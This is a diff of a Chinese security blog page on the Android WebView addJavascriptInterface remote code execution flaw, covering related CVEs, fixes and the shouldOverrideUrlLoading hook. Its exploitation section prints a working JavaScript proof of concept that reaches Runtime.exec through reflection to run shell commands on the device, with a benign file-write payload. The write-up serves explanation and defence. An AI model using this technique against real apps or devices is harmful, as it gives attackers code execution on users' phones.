-<h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">cmd</span>)&#123;</span><br><span class="language-javascript">  <span class="hljs-keyword">return</span></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">jsinterface</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;getRuntime&#x27;</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">invoke</span>(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">exec</span>(cmd);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">execute</span>([<span class="hljs-string">&#x27;/system/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">cmd</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">jsinterface</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getMethod</span>(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>,<span class="literal">null</span>).<span class="title function_">exec</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">execute</span>([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p>
 <h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p>
 <p><a target="_blank" rel="noopener" href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p>
 <p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p>
 <p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">removeJavascriptInterface(<span class="hljs-string">&quot;accessibility&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;accessibilityTraversal&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;searchBoxJavaBridge_&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul>
@@ -370,351 +223,158 @@
 <li><a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li>
 </ul>
 <h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldOverrideUrlLoading</span><span class="hljs-params">(WebView view, String url)</span> &#123;<br>  <span class="hljs-keyword">if</span> (url.substring(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>).equalsIgnoreCase(<span class="hljs-string">&quot;yourscheme:&quot;</span>)) &#123;<br>    <span class="hljs-comment">// parse the URL object and execute functions</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-attr">yourscheme</span>:<span class="hljs-comment">//method?parameter=value</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="attr">yourscheme</span>:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure>
 
 
 <p>Google对这个方法的解释如下：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Give the host application a chance <span class="hljs-keyword">to</span> take <span class="hljs-keyword">over</span> the control <span class="hljs-keyword">when</span> a <span class="hljs-built_in">new</span> url <br><span class="hljs-keyword">is</span> about <span class="hljs-keyword">to</span> be loaded <span class="hljs-keyword">in</span> the <span class="hljs-keyword">current</span> WebView. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <br>provided, <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span> WebView will ask Activity Manager <span class="hljs-keyword">to</span> choose the proper <br><span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> the url. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> provided, <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span> means the <br>host application handles the url, <span class="hljs-keyword">while</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span> means the <span class="hljs-keyword">current</span> <br>WebView handles the url. This <span class="hljs-keyword">method</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">called</span> <span class="hljs-keyword">for</span> requests <span class="hljs-keyword">using</span> <br>the POST &quot;method&quot;.<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure>
 
 <p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Security/" class="print-no-link">#Security</a>
-      
-        <a href="/tags/Android/" class="print-no-link">#Android</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>Android WebView 漏洞</div>
-      <div>http://usmacd.com/cn/webview_java/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>Author</div>
-          <div>henices</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Posted on</div>
-          <div>September 6, 2023</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>Licensed under</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
   </div>
+</article>
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/cn/Windows_Rx034/" title="解决 Windows Rx034">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">解决 Windows Rx034</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/cn/vnc/" title="Fedora 安装 vnc server">
-                        <span class="hidden-mobile">Fedora 安装 vnc server</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-            
-          </article>
-        </div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%9D%A5%E8%87%AA-developer-android-com-%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">☆ 来自 developer.android.com 的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">☆ 相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebView%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">WebView的使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Reflection"><span class="toc-number">2.2.</span> <span class="toc-text">Java Reflection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87reflection-%E8%AE%BF%E9%97%AEprivate"><span class="toc-number">2.3.</span> <span class="toc-text">通过reflection 访问private</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">☆  相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2013-4710"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2013-4710</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2012-6636-%E5%85%B3%E9%94%AE%E7%9A%84CVE"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2012-6636  (关键的CVE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-7224"><span class="toc-number">3.4.</span> <span class="toc-text">CVE-2014-7224</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">☆ 漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">☆ 漏洞利用的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95%E5%92%8C%E7%8E%B0%E7%8A%B6"><span class="toc-number">6.</span> <span class="toc-text">☆ 修复方法和现状</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">☆ 参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%80%9D%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">☆ 思考</span></a></li></ol>
       </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/webview_java/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/webview_java/&text=Android WebView 漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/webview_java/&is_video=false&description=Android WebView 漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Android WebView 漏洞&body=Check out this article: http://usmacd.com/cn/webview_java/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/webview_java/&name=Android WebView 漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/webview_java/&t=Android WebView 漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
+
   </div>
 </div>
 
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
     
-
     
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
+    2004-2024
+    henices
   </div>
-</div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
 
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
-  
-  
-  
-  
-</div>
+    <!-- styles -->
 
-  </footer>
 
-  <!-- Scripts -->
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
     })
+  })
   </script>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
+<!-- utterances Comments -->
 
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
 </body>
 </html>
